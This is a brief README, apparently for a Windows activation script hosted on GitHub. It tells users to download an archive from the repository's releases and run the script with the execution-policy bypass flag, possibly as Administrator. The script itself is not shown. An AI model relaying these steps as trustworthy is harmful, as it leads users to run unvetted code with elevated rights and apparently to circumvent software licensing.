# Running the Script

## Prerequisites
- Windows PowerShell (built-in on Windows 10/11)
- Administrator privileges (may be required depending on script operations)

## Quick Start
1. Go to [Releases](https://github.com/nabelgaslilia-tech/get.activated.win/releases) and download the latest `.zip` or `.7z` file
2. Extract the archive to your desired location
3. Open **Windows PowerShell** or **Terminal** (Windows 11)
4. Navigate to the extracted folder
5. Run the script:
   ```powershell
   powershell -ExecutionPolicy Bypass -File .\myscript.ps1
   ```
   > **Note:** This only bypasses execution policy for this single script run and doesn't permanently change system settings.

**Alternative (easier):** Simply double-click the `.bat` file if available or you're lazy.

## Editing the Script

To view or modify the source code:
1. Right-click the `.ps1` file
2. Select **"Open With"** → **"Notepad"** (or your preferred editor)
3. Copy all code: `Ctrl + A`, then `Ctrl + C`

**Recommended editors for better syntax highlighting:**
- Notepad++
- Visual Studio Code
- PowerShell ISE (built-in)

## Troubleshooting

- **"ExecutionPolicy" error:** Re-run with the bypass flag as shown above
- **"File not found":** Ensure you're in the correct folder and the filename matches
- **Permission denied:** Try opening PowerShell as Administrator
